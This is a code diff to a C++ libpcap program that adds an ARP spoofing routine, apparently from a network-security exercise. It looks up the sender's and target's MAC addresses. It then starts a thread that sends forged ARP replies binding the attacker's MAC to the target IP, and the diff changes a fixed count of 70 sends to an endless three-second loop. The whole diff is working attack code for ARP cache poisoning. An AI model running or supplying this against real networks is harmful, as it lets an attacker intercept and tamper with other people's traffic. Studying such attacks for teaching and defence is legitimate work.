@@ -114,7 +114,7 @@ int send_arp_reply(pcap_t *pcap, EthArpPacket packet)
     {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
     }
-    printf("send arp reply\n");
+
     return 1;
 }
 
@@ -124,11 +124,63 @@ void *t_send_arp_replys(void *argv)
     ArpReqs arpReqs = arpTArgs->arpReqs_;
     EthArpPacket packet = gen_arp_reply(arpReqs.smac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_);
 
-    for (int i = 0; i < 70; i++)
+    int i = 0;
+    while (true)
     {
+        i++;
         send_arp_reply(arpTArgs->pcap_, packet);
+        printf("----[sending arp reply [%d]]----\n", i);
+        printf("smac : %s \n", std::string(packet.arp_.smac()).c_str());
+        printf("tmac : %s \n", std::string(packet.arp_.tmac()).c_str());
+        printf("sip : %s \n", std::string(packet.arp_.sip()).c_str());
+        printf("tip : %s \n", std::string(packet.arp_.tip()).c_str());
+        printf("---------------------------\n");
         sleep(3);
     }
+
+    pthread_exit(NULL);
+}
+
+int arp_spoof(ArpSpoofReqs arpSpoofReqs)
+{
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t *pcap = pcap_open_live(arpSpoofReqs.interface_, BUFSIZ, 1, 1000, errbuf); // BUFSIZ 8192
+    if (pcap == nullptr)
+    {
+        fprintf(stderr, "couldn't open device %s(%s)\n", arpSpoofReqs.interface_, errbuf);
+        return -1;
+    }
+
+    int status;
+    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
+    arpReqs.smac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.sip_);
+    arpReqs.tmac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.tip_);
+
+    printf("sender mac:  %s\n", std::string(arpReqs.smac_).c_str());
+    printf("target mac:  %s\n", std::string(arpReqs.tmac_).c_str());
+
+    ArpTArgs *arpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
+    arpTArgs->pcap_ = pcap;
+    arpTArgs->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_);
+
+    int thr_id;
+    pthread_t pthread;
+    thr_id = pthread_create(&pthread, NULL, t_send_arp_replys, (void *)arpTArgs);
+    if (thr_id < 0)
+    {
+        perror("pthread0 create error");
+        exit(EXIT_FAILURE);
+    }
+
+    pthread_join(pthread, (void **)&status);
+
+    pcap_close(pcap);
+}
+
+void *t_arp_spoof(void *argv)
+{
+    ArpSpoofReqs *arpSpoofReqs_t = (ArpSpoofReqs *)argv;
+    arp_spoof(*arpSpoofReqs_t);
 
     pthread_exit(NULL);
 }
